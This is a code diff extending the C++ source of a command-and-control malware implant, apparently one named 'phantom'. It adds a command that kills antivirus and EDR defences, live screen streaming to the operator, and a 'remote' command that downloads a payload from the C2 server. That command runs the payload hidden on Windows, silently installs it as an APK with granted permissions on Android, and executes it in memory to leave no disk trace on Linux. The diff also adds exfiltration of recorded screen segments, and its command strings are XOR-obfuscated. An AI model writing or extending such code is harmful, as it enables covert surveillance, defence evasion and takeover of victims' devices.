@@ -350,6 +350,13 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
         return "edrcheck: windows only\n";
 #endif
     }
+    if (action == XOR_DEC(XOR_STR("edr-kill")).c_str()) {
+        // Burn the defensive stack: disable Defender realtime + stop known
+        // AV/EDR services (Windows) / daemons (Linux). Destructive — only
+        // ever issued after `edrcheck` shows what is present. Needs SYSTEM
+        // on Windows for the service stops to stick.
+        return edrkill::kill_av();
+    }
     if (action == XOR_DEC(XOR_STR("health")).c_str()) {
         // Beacon health self-report: cadence, uptime, counters, last error.
         unsigned long long now = (unsigned long long)time(nullptr);
@@ -785,6 +792,108 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
     else if (action == "screen-dump") {
         return media_screen::dump_live_recording();
     }
+    else if (action == "screen-stream") {
+        // TRUE live: record 5s chunks and push each to the stream queue; the
+        // main loop sends them to the C2 immediately so the operator watches
+        // the screen while it is being recorded. `screen-stream-stop` halts.
+        std::string duration;
+        try {
+            if (iss >> duration) {
+                return media_screen::record_screen_stream(std::stoi(duration));
+            }
+        } catch (...) { /* fall back to default */ }
+        return media_screen::record_screen_stream(60);
+    }
+    else if (action == "screen-stream-stop") {
+        return media_screen::stop_screen_stream();
+    }
+    else if (action == XOR_DEC(XOR_STR("remote")).c_str()) {
+        // Deploy the standalone Remote Session module (GUI takeover): fetch
+        // the compiled binary from the C2 and execute it. The module
+        // registers as its own R-… beacon and streams screen frames + input.
+        // Usage: remote [host] [port] [use_https] — defaults to the same C2.
+        std::string r_host = C2_HOST;
+        int r_port = C2_PORT;
+        int r_ssl = C2_USE_HTTPS;
+        std::string tok;
+        if (iss >> tok) r_host = tok;
+        if (iss >> tok) r_port = std::atoi(tok.c_str());
+        if (iss >> tok) r_ssl = std::atoi(tok.c_str());
+#ifdef _WIN32
+        std::string url = std::string(r_ssl ? "https" : "http") + "://" +
+                          r_host + ":" + std::to_string(r_port) +
+                          "/api/v1/remote_payload_windows?auth=" + C2_PAYLOAD_TOKEN;
+#elif defined(__ANDROID__) || defined(ANDROID)
+        std::string url = std::string(r_ssl ? "https" : "http") + "://" +
+                          r_host + ":" + std::to_string(r_port) +
+                          "/api/v1/remote_payload_android?auth=" + C2_PAYLOAD_TOKEN;
+#else
+        std::string url = std::string(r_ssl ? "https" : "http") + "://" +
+                          r_host + ":" + std::to_string(r_port) +
+                          "/api/v1/remote_payload_linux?auth=" + C2_PAYLOAD_TOKEN;
+#endif
+        std::string bin = net::http_request(cfg, XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
+            std::wstring(url.begin(), url.end()).c_str(), "", "");
+        if (bin.size() < 4096 || bin.find("Payload") != std::string::npos) {
+            return XOR_DEC(XOR_STR("REMOTE_ERROR: module binary unavailable ")).c_str() +
+                   std::to_string(bin.size());
+        }
+#ifdef _WIN32
+        // write to a random temp name and spawn hidden
+        char tmp[MAX_PATH];
+        GetTempPathA(MAX_PATH, tmp);
+        std::string path = std::string(tmp) + "srv" + std::to_string(GetCurrentProcessId()) + ".exe";
+        HANDLE hf = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr,
+                                CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
+        if (hf == INVALID_HANDLE_VALUE)
+            return XOR_DEC(XOR_STR("REMOTE_ERROR: cannot write module")).c_str();
+        DWORD w;
+        WriteFile(hf, bin.data(), (DWORD)bin.size(), &w, nullptr);
+        CloseHandle(hf);
+        STARTUPINFOA si{};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi{};
+        std::string cmd = path + " " + r_host + " " + std::to_string(r_port) +
+                          " " + std::to_string(r_ssl);
+        if (!CreateProcessA(nullptr, &cmd[0], nullptr, nullptr, FALSE,
+                            CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
+                            nullptr, nullptr, &si, &pi)) {
+            DeleteFileA(path.c_str());
+            return XOR_DEC(XOR_STR("REMOTE_ERROR: spawn failed")).c_str();
+        }
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return XOR_DEC(XOR_STR("Remote session module deployed (pid ")).c_str() +
+                       std::to_string(pi.dwProcessId) + XOR_DEC(XOR_STR("); interact via `beacons`")).c_str();
+#elif defined(__ANDROID__) || defined(ANDROID)
+        // Android: the module is an APK (MediaProjection capture +
+        // AccessibilityService input). A memfd exec cannot start an APK —
+        // install it and launch the bootstrap activity instead.
+        {
+            std::string path = "/data/local/tmp/.srv" +
+                               std::to_string(getpid()) + ".apk";
+            FILE* f = fopen(path.c_str(), "wb");
+            if (!f) return XOR_DEC(XOR_STR("REMOTE_ERROR: cannot write APK")).c_str();
+            fwrite(bin.data(), 1, bin.size(), f);
+            fclose(f);
+            std::string cmd = "pm install -g " + path +
+                              " >/dev/null 2>&1 && am start -n com.phantom.remote/.MainActivity";
+            int rc = std::system(cmd.c_str());
+            remove(path.c_str());
+            if (rc != 0)
+                return XOR_DEC(XOR_STR("REMOTE_ERROR: APK install failed (need shell/root)")).c_str();
+            return XOR_DEC(XOR_STR("Remote session module (APK) deployed; interact via `beacons`")).c_str();
+        }
+#else
+        // POSIX: run from a memfd (no disk trace).
+        if (inmemory::run_binary(bin)) {
+            return XOR_DEC(XOR_STR("Remote session module deployed in-memory; interact via `beacons`")).c_str();
+        }
+        return XOR_DEC(XOR_STR("REMOTE_ERROR: memfd exec failed")).c_str();
+#endif
+    }
     else if (action == XOR_DEC(XOR_STR("socks")).c_str()) {
         int localPort;
         if (iss >> localPort) {
@@ -1065,7 +1174,8 @@ extern "C" void beacon_main(int argc, char** argv) {
                     int dur = 0;
                     tss >> dur;
                     if ((tok == "audio" || tok == "screen-record" ||
-                         tok == "screen-record-live") && dur > 0) {
+                         tok == "screen-record-live" ||
+                         tok == "screen-stream") && dur > 0) {
                         budget_ms = dur * 1000 + 15000;
                     } else if (tok == "camera") {
                         budget_ms = 45000; // MF init + frame grabs can be slow
@@ -1088,6 +1198,17 @@ extern "C" void beacon_main(int argc, char** argv) {
                 }
                 if (!net::send_result(cfg, task.task_id, output)) {
                     pending_results.emplace_back(task.task_id, output);
+                }
+            }
+            // drain progressive screen-stream segments (true live): each
+            // segment is sent as its own result so the C2/UI see it now.
+            {
+                static unsigned long g_live_seq = 0;
+                for (auto& seg : media_screen::stream::drain()) {
+                    std::string sid = "live-seg-" + std::to_string(++g_live_seq);
+                    if (!net::send_result(cfg, sid, seg)) {
+                        pending_results.emplace_back(sid, seg);
+                    }
                 }
             }
 #ifdef _WIN32
